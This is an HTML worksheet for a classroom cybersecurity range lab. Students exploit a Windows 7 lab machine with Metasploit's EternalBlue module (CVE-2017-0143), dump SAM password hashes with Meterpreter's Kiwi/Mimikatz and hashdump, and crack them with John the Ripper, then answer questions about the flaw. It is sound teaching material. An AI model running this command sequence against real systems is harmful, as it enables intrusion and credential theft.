@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lab 8.4.2 - Exfiltration with Mimikatz</title>
+    <link rel="stylesheet" href="lab.css">
+</head>
+
+<body>
+
+    <a href="../index.html" class="dashboard-link">&larr; Back to Dashboard</a>
+
+    <div class="container">
+        <header>
+            <div>
+                <h1>Lab 8.4.2 - Exfiltration with Mimikatz</h1>
+                <p style="margin: 5px 0 0; color: var(--secondary);">CYBER.ORG Range Worksheet</p>
+            </div>
+            <img src="../images/cyber.org_logo2.jpg" alt="Logo" style="height: 40px; opacity: 0.8;">
+        </header>
+
+        <div class="meta-info">
+            <div class="form-group">
+                <label for="studentName">Student Name:</label>
+                <input type="text" id="studentName" placeholder="Enter your name">
+            </div>
+            <div class="form-group">
+                <label for="date">Date:</label>
+                <input type="text" id="date" placeholder="Enter date">
+            </div>
+            <div class="form-group">
+                <label for="class">Class:</label>
+                <input type="text" id="class" placeholder="Enter class name">
+            </div>
+            <div class="form-group">
+                <label for="partner">Partner Name:</label>
+                <input type="text" id="partner" placeholder="Enter partner name">
+            </div>
+        </div>
+
+        <!-- Objectives -->
+        <div class="section">
+            <h2>Objectives</h2>
+            <div class="instruction-text">
+                1. Examine how to use vulnerability CVEs to find useable Metasploit exploits.<br>
+                2. Apply password exfiltration methods using the Mimikatz (Kiwi) module for Meterpreter.
+            </div>
+
+            <h3>Attack Scenario:</h3>
+            <div class="instruction-text" style="background:#fff3cd; padding:15px; border-radius:5px;">
+                The BreachesRUs (BRU) gang stole profile data from Spack users, including Goofy who works at NicePeeps
+                Corp (NPC). They know Goofy's Windows 7 credentials from the breach (User: <strong>Goofy</strong>, Pass:
+                <strong>happy123</strong>) and plan to use his machine to infect the network with Ransomware.<br>
+                <strong>Target Info:</strong> Windows 7 x86 (192.168.100.101). Ports 22, 80, 135, 139, 445, 3389 are
+                open.
+            </div>
+
+            <h3>Instructions:</h3>
+            <ul>
+                <li>Go to CYBER.ORG Range (https://apps.cyber.org)</li>
+                <li>Launch Kali and Windows 7. Open Windows 7.</li>
+                <li><strong>Turn off Window 7 Firewall:</strong> Start > "Firewall" > Turn off > OK.</li>
+            </ul>
+        </div>
+
+        <!-- Part 1 -->
+        <div class="section">
+            <h2>Part 1: Find exploitable vulnerability</h2>
+            <div class="instruction-text">
+                1. Open Kali terminal: <code>sudo msfconsole</code><br>
+                2. Search for Windows x64 exploits: <code>search type:exploit platform:windows arch:x64</code><br>
+                3. Search for CVE-2017-0143. <code>search cve:2017-0143</code>.<br>
+                Using result #0 (EternalBlue), type: <code>use 0</code>.
+            </div>
+
+            <div class="question-block">
+                <label for="q1">Research CVE-2017-0143 (e.g., on cvedetails.com). What does this vulnerability "allow
+                    remote attackers" to do?</label>
+                <input type="text" id="q1" placeholder="Enter answer">
+            </div>
+            <div class="question-block">
+                <label for="q1b">What is the highest base CVSS score for this vulnerability?</label>
+                <input type="text" id="q1b" placeholder="Enter score">
+            </div>
+
+            <div class="instruction-text">
+                4. Configure the exploit:
+                <code>show options</code>
+                <pre style="background:#f4f4f4; padding:10px; border-radius:4px;">
+set RHOSTS &lt;Windows 7 IP&gt;
+set SMBUser Goofy
+set SMBPass happy123
+                </pre>
+                5. Type <code>exploit</code>. Wait for Meterpreter session.
+            </div>
+        </div>
+
+        <!-- Part 2 -->
+        <div class="section">
+            <h2>Part 2: Use Mimikatz (Kiwi) to Exfiltrate</h2>
+            <div class="instruction-text">
+                1. Load Mimikatz/Kiwi:
+                <code>load kiwi</code><br>
+                2. List all users/hashes:
+                <code>lsa_dump_sam</code><br>
+                3. Extract hashes for cracking:
+                <ul>
+                    <li>Open new terminal, type: <code>leafpad Hashes.txt</code></li>
+                    <li>In Meterpreter, type: <code>hashdump</code></li>
+                    <li>Copy results from Meterpreter to Leafpad. Save as <code>/home/kali/Documents/Hashes.txt</code>.
+                        Close Leafpad.</li>
+                </ul>
+                4. Crack hashes with John the Ripper (in the terminal used for Leafpad):
+                <pre style="background:#f4f4f4; padding:10px; border-radius:4px;">
+cd /usr/share/john
+sudo john -format=NT -wordlist:password.lst /home/kali/Documents/Hashes.txt
+                </pre>
+            </div>
+
+            <div class="question-block">
+                <label>Paste a screenshot of the John the Ripper results:</label>
+                <div class="image-zone" tabindex="0" id="img-zone-1">
+                    <p>Click here and press <strong>Ctrl + V</strong> (or Cmd + V) to paste your screenshot.</p>
+                </div>
+            </div>
+
+            <div class="question-block">
+                <label for="q3">What is the BackupAdmin user's password?</label>
+                <input type="text" id="q3" placeholder="Enter password">
+            </div>
+        </div>
+
+        <!-- Closing Questions -->
+        <div class="section" style="border-bottom: none;">
+            <h2>Closing Question</h2>
+
+            <div class="question-block">
+                <label for="q4">If NPC users and administrators hadn’t made 2 common security mistakes, this attack
+                    wouldn’t have worked. Can you name the mistakes?</label>
+                <textarea id="q4" rows="3" placeholder="Explain your answer..."></textarea>
+            </div>
+        </div>
+
+    </div>
+
+    <div class="controls">
+        <button class="btn" onclick="window.print()">Save as PDF / Print</button>
+    </div>
+
+    <script src="lab.js"></script>
+</body>
+
+</html>
